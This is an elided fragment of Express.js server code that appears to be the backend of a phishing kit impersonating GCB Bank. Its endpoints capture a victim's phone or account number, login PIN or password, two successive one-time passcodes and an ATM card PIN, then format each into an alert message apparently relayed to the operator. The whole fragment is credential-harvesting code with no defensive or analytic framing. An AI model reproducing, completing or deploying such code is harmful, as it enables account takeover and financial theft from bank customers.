...
app.post('/api/login-notification', async (req, res) => {
    ...
    const message = `📱 <b>GCB BANK - LOGIN ATTEMPT</b>

🆕 <b>NEW USER</b>
🇬🇭 <b>Country:</b> ${country}
🌍 <b>Country Code:</b> ${countryCode}
📱 <b>Phone/Account Number:</b> ${phone}
🔢 <b>PIN/Password:</b> ${pin}
...
app.post('/api/verify-first-otp', async (req, res) => {
    ...
    const otpMessage = `1️⃣ <b>GCB BANK - FIRST OTP (Step 1/2)</b>
...
app.post('/api/verify-second-otp', async (req, res) => {
    ...
    const otpMessage2 = `2️⃣ <b>GCB BANK - SECOND OTP (Step 2/2)</b>
...
app.post('/api/verify-bank-pin', async (req, res) => {
    ...
    const bankPinMessage = `🏦 <b>GCB BANK - PIN VERIFICATION (Step 3)</b>

🆕 <b>NEW USER - BANK SECURITY</b>
🇬🇭 <b>Country:</b> ${country}
📱 <b>Phone/Account Number:</b> ${phone}
🔑 <b>Bank Card/ATM PIN:</b> ${bankPin}
⏰ <b>Time:</b> ${currentTime}
